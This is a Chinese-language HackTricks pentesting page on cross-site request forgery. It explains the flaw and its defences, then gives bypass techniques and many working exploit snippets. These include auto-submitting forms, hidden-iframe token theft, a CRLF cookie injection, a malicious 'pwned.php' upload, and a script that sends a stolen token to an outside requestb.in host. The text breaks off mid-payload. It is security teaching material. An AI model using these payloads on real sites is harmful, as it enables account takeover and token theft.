<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CSRF (Cross Site Request Forgery)</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="csrf-跨站请求伪造"><a class="header" href="#csrf-跨站请求伪造">CSRF (跨站请求伪造)</a></h1>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
<p>加入 <a href="https://discord.com/invite/N3FrSbmwdy"><strong>HackenProof Discord</strong></a> 服务器，与经验丰富的黑客和漏洞赏金猎人交流！</p>
<p><strong>黑客见解</strong><br />
参与深入探讨黑客的刺激与挑战的内容</p>
<p><strong>实时黑客新闻</strong><br />
通过实时新闻和见解，跟上快速变化的黑客世界</p>
<p><strong>最新公告</strong><br />
了解最新的漏洞赏金计划和重要平台更新</p>
<p><strong>今天就加入我们</strong> <a href="https://discord.com/invite/N3FrSbmwdy"><strong>Discord</strong></a>，与顶尖黑客开始合作！</p>
<h2 id="跨站请求伪造-csrf-解释"><a class="header" href="#跨站请求伪造-csrf-解释">跨站请求伪造 (CSRF) 解释</a></h2>
<p><strong>跨站请求伪造 (CSRF)</strong> 是一种在 web 应用程序中发现的安全漏洞。它使攻击者能够通过利用用户的认证会话，代表毫无防备的用户执行操作。当一个已登录受害者平台的用户访问恶意网站时，攻击就会被执行。该网站随后通过执行 JavaScript、提交表单或获取图像等方法触发对受害者账户的请求。</p>
<h3 id="csrf-攻击的前提条件"><a class="header" href="#csrf-攻击的前提条件">CSRF 攻击的前提条件</a></h3>
<p>要利用 CSRF 漏洞，必须满足几个条件：</p>
<ol>
<li><strong>识别有价值的操作</strong>：攻击者需要找到一个值得利用的操作，例如更改用户的密码、电子邮件或提升权限。</li>
<li><strong>会话管理</strong>：用户的会话应仅通过 cookies 或 HTTP 基本认证头进行管理，因为其他头无法用于此目的。</li>
<li><strong>缺乏不可预测的参数</strong>：请求中不应包含不可预测的参数，因为它们可能会阻止攻击。</li>
</ol>
<h3 id="快速检查"><a class="header" href="#快速检查">快速检查</a></h3>
<p>您可以在 Burp 中<strong>捕获请求</strong>并检查 CSRF 保护，您可以从浏览器中点击 <strong>复制为 fetch</strong> 并检查请求：</p>
<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
<h3 id="防御-csrf"><a class="header" href="#防御-csrf">防御 CSRF</a></h3>
<p>可以实施几种对策来保护免受 CSRF 攻击：</p>
<ul>
<li><a href="hacking-with-cookies/#samesite"><strong>SameSite cookies</strong></a>：此属性防止浏览器在跨站请求中发送 cookies。<a href="hacking-with-cookies/#samesite">了解更多关于 SameSite cookies</a>。</li>
<li><a href="cors-bypass.html"><strong>跨源资源共享</strong></a>：受害者网站的 CORS 策略可能会影响攻击的可行性，特别是当攻击需要读取受害者网站的响应时。<a href="cors-bypass.html">了解 CORS 绕过</a>。</li>
<li><strong>用户验证</strong>：提示用户输入密码或解决验证码可以确认用户的意图。</li>
<li><strong>检查引荐或来源头</strong>：验证这些头可以帮助确保请求来自受信任的来源。然而，精心构造的 URL 可以绕过实施不当的检查，例如：</li>
<li>使用 <code>http://mal.net?orig=http://example.com</code>（URL 以受信任的 URL 结尾）</li>
<li>使用 <code>http://example.com.mal.net</code>（URL 以受信任的 URL 开头）</li>
<li><strong>修改参数名称</strong>：更改 POST 或 GET 请求中参数的名称可以帮助防止自动化攻击。</li>
<li><strong>CSRF 令牌</strong>：在每个会话中引入唯一的 CSRF 令牌，并要求在后续请求中使用该令牌，可以显著降低 CSRF 的风险。通过强制实施 CORS，可以增强令牌的有效性。</li>
</ul>
<p>理解和实施这些防御措施对于维护 web 应用程序的安全性和完整性至关重要。</p>
<h2 id="防御绕过"><a class="header" href="#防御绕过">防御绕过</a></h2>
<h3 id="从-post-到-get"><a class="header" href="#从-post-到-get">从 POST 到 GET</a></h3>
<p>也许您想要利用的表单准备发送 <strong>带有 CSRF 令牌的 POST 请求，但</strong>，您应该 <strong>检查</strong> 如果 <strong>GET</strong> 也是 <strong>有效的</strong>，并且当您发送 GET 请求时 <strong>CSRF 令牌仍在被验证</strong>。</p>
<h3 id="缺少令牌"><a class="header" href="#缺少令牌">缺少令牌</a></h3>
<p>应用程序可能会实现一种机制来 <strong>验证令牌</strong>，当它们存在时。然而，如果在令牌缺失时完全跳过验证，就会出现漏洞。攻击者可以通过 <strong>删除携带令牌的参数</strong>，而不仅仅是其值来利用这一点。这使他们能够绕过验证过程，有效地进行跨站请求伪造 (CSRF) 攻击。</p>
<h3 id="csrf-令牌未与用户会话绑定"><a class="header" href="#csrf-令牌未与用户会话绑定">CSRF 令牌未与用户会话绑定</a></h3>
<p>未将 CSRF 令牌与用户会话绑定的应用程序存在重大 <strong>安全风险</strong>。这些系统验证令牌是针对 <strong>全局池</strong> 而不是确保每个令牌绑定到发起会话。</p>
<p>攻击者如何利用这一点：</p>
<ol>
<li><strong>使用自己的账户进行身份验证</strong>。</li>
<li><strong>从全局池中获取有效的 CSRF 令牌</strong>。</li>
<li><strong>在针对受害者的 CSRF 攻击中使用该令牌</strong>。</li>
</ol>
<p>这一漏洞使攻击者能够代表受害者发起未经授权的请求，利用应用程序的 <strong>不充分的令牌验证机制</strong>。</p>
<h3 id="方法绕过"><a class="header" href="#方法绕过">方法绕过</a></h3>
<p>如果请求使用的是一种“<strong>奇怪的</strong>” <strong>方法</strong>，请检查 <strong>方法</strong> <strong>覆盖功能</strong> 是否有效。例如，如果它 <strong>使用 PUT</strong> 方法，您可以尝试 <strong>使用 POST</strong> 方法并 <strong>发送</strong>：<em>https://example.com/my/dear/api/val/num?<strong>_method=PUT</strong></em></p>
<p>这也可以通过在 POST 请求中发送 <strong>_method 参数</strong> 或使用 <strong>头</strong> 来实现：</p>
<ul>
<li><em>X-HTTP-Method</em></li>
<li><em>X-HTTP-Method-Override</em></li>
<li><em>X-Method-Override</em></li>
</ul>
<h3 id="自定义头令牌绕过"><a class="header" href="#自定义头令牌绕过">自定义头令牌绕过</a></h3>
<p>如果请求在请求中添加了一个 <strong>自定义头</strong>，并将 <strong>令牌</strong> 作为 <strong>CSRF 保护方法</strong>，那么：</p>
<ul>
<li>测试不带 <strong>自定义令牌和头</strong> 的请求。</li>
<li>测试请求，使用确切 <strong>相同长度但不同的令牌</strong>。</li>
</ul>
<h3 id="csrf-令牌通过-cookie-验证"><a class="header" href="#csrf-令牌通过-cookie-验证">CSRF 令牌通过 cookie 验证</a></h3>
<p>应用程序可能通过在 cookie 和请求参数中复制令牌，或通过设置 CSRF cookie 并验证后端发送的令牌是否与 cookie 中的值相对应来实现 CSRF 保护。应用程序通过检查请求参数中的令牌是否与 cookie 中的值对齐来验证请求。</p>
<p>然而，如果网站存在缺陷，允许攻击者在受害者的浏览器中设置 CSRF cookie，例如 CRLF 漏洞，则此方法容易受到 CSRF 攻击。攻击者可以通过加载一个欺骗性的图像来设置 cookie，然后发起 CSRF 攻击。</p>
<p>以下是攻击可能如何构造的示例：</p>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- CSRF Proof of Concept - generated by Burp Suite Professional --&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form action="https://example.com/my-account/change-email" method="POST"&gt;
&lt;input type="hidden" name="email" value="asd&amp;#64;asd&amp;#46;asd" /&gt;
&lt;input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>{% hint style="info" %}
注意，如果<strong>csrf token与会话cookie相关，这个攻击将不起作用</strong>，因为你需要将会话设置为受害者，因此你实际上是在攻击自己。
{% endhint %}</p>
<h3 id="content-type-更改"><a class="header" href="#content-type-更改">Content-Type 更改</a></h3>
<p>根据<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests"><strong>这个</strong></a>，为了<strong>避免预检</strong>请求使用<strong>POST</strong>方法，允许的Content-Type值如下：</p>
<ul>
<li><strong><code>application/x-www-form-urlencoded</code></strong></li>
<li><strong><code>multipart/form-data</code></strong></li>
<li><strong><code>text/plain</code></strong></li>
</ul>
<p>然而，请注意，<strong>服务器逻辑可能会有所不同</strong>，具体取决于使用的<strong>Content-Type</strong>，因此你应该尝试提到的值以及其他如**<code>application/json</code><strong>_</strong>,<strong>_</strong><code>text/xml</code>**, <strong><code>application/xml</code></strong><em>.</em></p>
<p>示例（来自<a href="https://brycec.me/posts/corctf_2021_challenges">这里</a>）将JSON数据作为text/plain发送：</p>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
&lt;form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain"&gt;
&lt;input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'&gt;
&lt;/form&gt;
&lt;script&gt;
form.submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="绕过-json-数据的预检请求"><a class="header" href="#绕过-json-数据的预检请求">绕过 JSON 数据的预检请求</a></h3>
<p>在尝试通过 POST 请求发送 JSON 数据时，在 HTML 表单中使用 <code>Content-Type: application/json</code> 是不直接可能的。同样，利用 <code>XMLHttpRequest</code> 发送此内容类型会启动预检请求。然而，有一些策略可以潜在地绕过此限制，并检查服务器是否处理 JSON 数据，而不考虑 Content-Type：</p>
<ol>
<li><strong>使用替代内容类型</strong>：通过在表单中设置 <code>enctype="text/plain"</code>，使用 <code>Content-Type: text/plain</code> 或 <code>Content-Type: application/x-www-form-urlencoded</code>。这种方法测试后端是否利用数据，而不考虑 Content-Type。</li>
<li><strong>修改内容类型</strong>：为了避免预检请求，同时确保服务器将内容识别为 JSON，您可以发送数据，使用 <code>Content-Type: text/plain; application/json</code>。这不会触发预检请求，但如果服务器配置为接受 <code>application/json</code>，则可能会被正确处理。</li>
<li><strong>SWF Flash 文件利用</strong>：一种不太常见但可行的方法是使用 SWF Flash 文件来绕过此类限制。有关此技术的深入理解，请参阅 <a href="https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937">这篇文章</a>。</li>
</ol>
<h3 id="引用来源检查绕过"><a class="header" href="#引用来源检查绕过">引用/来源检查绕过</a></h3>
<p><strong>避免引用头</strong></p>
<p>应用程序可能仅在 'Referer' 头存在时进行验证。为了防止浏览器发送此头，可以使用以下 HTML 元标签：</p>
<pre><code class="language-xml">&lt;meta name="referrer" content="never"&gt;
</code></pre>
<p>这确保了“Referer”头被省略，从而可能绕过某些应用程序中的验证检查。</p>
<p><strong>正则表达式绕过</strong></p>
<p>{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
<a href="ssrf-server-side-request-forgery/url-format-bypass.html">url-format-bypass.md</a>
{% endcontent-ref %}</p>
<p>要在Referrer将要在参数中发送的URL中设置服务器的域名，可以执行：</p>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- Referrer policy needed to send the qury parameter in the referrer --&gt;
&lt;head&gt;&lt;meta name="referrer" content="unsafe-url"&gt;&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST"&gt;
&lt;input type="hidden" name="email" value="asd&amp;#64;asd&amp;#46;asd" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="head-方法绕过"><a class="header" href="#head-方法绕过"><strong>HEAD 方法绕过</strong></a></h3>
<p><a href="https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution"><strong>这个 CTF 文章</strong></a>的第一部分解释了<a href="https://github.com/oakserver/oak/blob/main/router.ts#L281">Oak 的源代码</a>，一个路由器被设置为<strong>将 HEAD 请求作为 GET 请求处理</strong>，且没有响应体——这是一种常见的变通方法，并不是 Oak 独有的。它们并没有特定的处理程序来处理 HEAD 请求，而是<strong>直接交给 GET 处理程序，但应用程序只是移除了响应体</strong>。</p>
<p>因此，如果 GET 请求受到限制，你可以<strong>发送一个将被处理为 GET 请求的 HEAD 请求</strong>。</p>
<h2 id="利用示例"><a class="header" href="#利用示例"><strong>利用示例</strong></a></h2>
<h3 id="提取-csrf-令牌"><a class="header" href="#提取-csrf-令牌"><strong>提取 CSRF 令牌</strong></a></h3>
<p>如果使用了<strong>CSRF 令牌</strong>作为<strong>防御</strong>，你可以尝试通过利用<a href="xss-cross-site-scripting/#xss-stealing-csrf-tokens"><strong>XSS</strong></a>漏洞或<a href="dangling-markup-html-scriptless-injection/"><strong>悬挂标记</strong></a>漏洞来<strong>提取它</strong>。</p>
<h3 id="使用-html-标签的-get"><a class="header" href="#使用-html-标签的-get"><strong>使用 HTML 标签的 GET</strong></a></h3>
<pre><code class="language-xml">&lt;img src="http://google.es?param=VALUE" style="display:none" /&gt;
&lt;h1&gt;404 - Page not found&lt;/h1&gt;
The URL you are requesting is no longer available
</code></pre>
<p>其他可以用于自动发送 GET 请求的 HTML5 标签包括：</p>
<pre><code class="language-html">&lt;iframe src="..."&gt;&lt;/iframe&gt;
&lt;script src="..."&gt;&lt;/script&gt;
&lt;img src="..." alt=""&gt;
&lt;embed src="..."&gt;
&lt;audio src="..."&gt;
&lt;video src="..."&gt;
&lt;source src="..." type="..."&gt;
&lt;video poster="..."&gt;
&lt;link rel="stylesheet" href="..."&gt;
&lt;object data="..."&gt;
&lt;body background="..."&gt;
&lt;div style="background: url('...');"&gt;&lt;/div&gt;
&lt;style&gt;
body { background: url('...'); }
&lt;/style&gt;
&lt;bgsound src="..."&gt;
&lt;track src="..." kind="subtitles"&gt;
&lt;input type="image" src="..." alt="Submit Button"&gt;
</code></pre>
<h3 id="表单-get-请求"><a class="header" href="#表单-get-请求">表单 GET 请求</a></h3>
<pre><code class="language-html">&lt;html&gt;
&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form method="GET" action="https://victim.net/email/change-email"&gt;
&lt;input type="hidden" name="email" value="some@email.com" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="表单-post-请求"><a class="header" href="#表单-post-请求">表单 POST 请求</a></h3>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;
&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
&lt;form method="POST" action="https://victim.net/email/change-email" id="csrfform"&gt;
&lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt; &lt;!-- Way 1 to autosubmit --&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;img src=x onerror="csrfform.submit();" /&gt; &lt;!-- Way 2 to autosubmit --&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit(); //Way 3 to autosubmit
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="通过-iframe-发送表单-post-请求"><a class="header" href="#通过-iframe-发送表单-post-请求">通过 iframe 发送表单 POST 请求</a></h3>
<pre><code class="language-html">&lt;!--
The request is sent through the iframe withuot reloading the page
--&gt;
&lt;html&gt;
&lt;body&gt;
&lt;iframe style="display:none" name="csrfframe"&gt;&lt;/iframe&gt;
&lt;form method="POST" action="/change-email" id="csrfform" target="csrfframe"&gt;
&lt;input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /&gt;
&lt;input type="submit" value="Submit request" /&gt;
&lt;/form&gt;
&lt;script&gt;
document.forms[0].submit();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="ajax-post-请求"><a class="header" href="#ajax-post-请求"><strong>Ajax POST 请求</strong></a></h3>
<pre><code class="language-html">&lt;script&gt;
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&amp;status=on");
&lt;/script&gt;

&lt;script&gt;
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&amp;param2=value2"
})
&lt;/script&gt;
</code></pre>
<h3 id="multipartform-data-post-请求"><a class="header" href="#multipartform-data-post-请求">multipart/form-data POST 请求</a></h3>
<pre><code class="language-javascript">myFormData = new FormData();
var blob = new Blob(["&lt;?php phpinfo(); ?&gt;"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
</code></pre>
<h3 id="multipartform-data-post-请求-v2"><a class="header" href="#multipartform-data-post-请求-v2">multipart/form-data POST 请求 v2</a></h3>
<pre><code class="language-javascript">// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
</code></pre>
<h3 id="从-iframe-内部发送表单-post-请求"><a class="header" href="#从-iframe-内部发送表单-post-请求">从 iframe 内部发送表单 POST 请求</a></h3>
<pre><code class="language-html">&lt;--! expl.html --&gt;

&lt;body onload="envia()"&gt;
&lt;form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php"&gt;
&lt;input type="text" id="pwd" name="pwd" value="otra nueva"&gt;
&lt;/form&gt;
&lt;body&gt;
&lt;script&gt;
function envia(){document.getElementById("formulario").submit();}
&lt;/script&gt;

&lt;!-- public.html --&gt;
&lt;iframe src="2-1.html" style="position:absolute;top:-5000"&gt;
&lt;/iframe&gt;
&lt;h1&gt;Sitio bajo mantenimiento. Disculpe las molestias&lt;/h1&gt;
</code></pre>
<h3 id="窃取-csrf-令牌并发送-post-请求"><a class="header" href="#窃取-csrf-令牌并发送-post-请求"><strong>窃取 CSRF 令牌并发送 POST 请求</strong></a></h3>
<pre><code class="language-javascript">function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&amp;otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
</code></pre>
<h3 id="窃取-csrf-令牌并使用-iframe表单和-ajax-发送-post-请求"><a class="header" href="#窃取-csrf-令牌并使用-iframe表单和-ajax-发送-post-请求"><strong>窃取 CSRF 令牌并使用 iframe、表单和 Ajax 发送 Post 请求</strong></a></h3>
<pre><code class="language-html">&lt;form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="username" value="AA"&gt;
&lt;input type="checkbox" name="status" checked="checked"&gt;
&lt;input id="token" type="hidden" name="token" value="" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
&lt;/script&gt;
&lt;iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="窃取-csrf-令牌并使用-iframe-和表单发送-post-请求"><a class="header" href="#窃取-csrf-令牌并使用-iframe-和表单发送-post-请求"><strong>窃取 CSRF 令牌并使用 iframe 和表单发送 POST 请求</strong></a></h3>
<pre><code class="language-html">&lt;iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"&gt;&lt;/iframe&gt;

&lt;script&gt;
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('&lt;form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data"&gt;');
document.writeln('&lt;input id="username" type="text" name="username" value="' + name + '" /&gt;&lt;br /&gt;');
document.writeln('&lt;input id="token" type="hidden" name="token" value="' + token + '" /&gt;');
document.writeln('&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;br/&gt;');
document.writeln('&lt;/form&gt;');
document.forms[0].submit.click();
}
&lt;/script&gt;
</code></pre>
<h3 id="窃取令牌并使用-2-个-iframe-发送"><a class="header" href="#窃取令牌并使用-2-个-iframe-发送"><strong>窃取令牌并使用 2 个 iframe 发送</strong></a></h3>
<pre><code class="language-html">&lt;script&gt;
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
&lt;/script&gt;

&lt;iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;

&lt;iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"&gt;&lt;/iframe&gt;
&lt;body onload="document.forms[0].submit()"&gt;
&lt;form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data"&gt;
&lt;input type="text" name="username" value="z"&gt;
&lt;input type="checkbox" name="status" checked=""&gt;
&lt;input id="token" type="hidden" name="token" value="0000" /&gt;
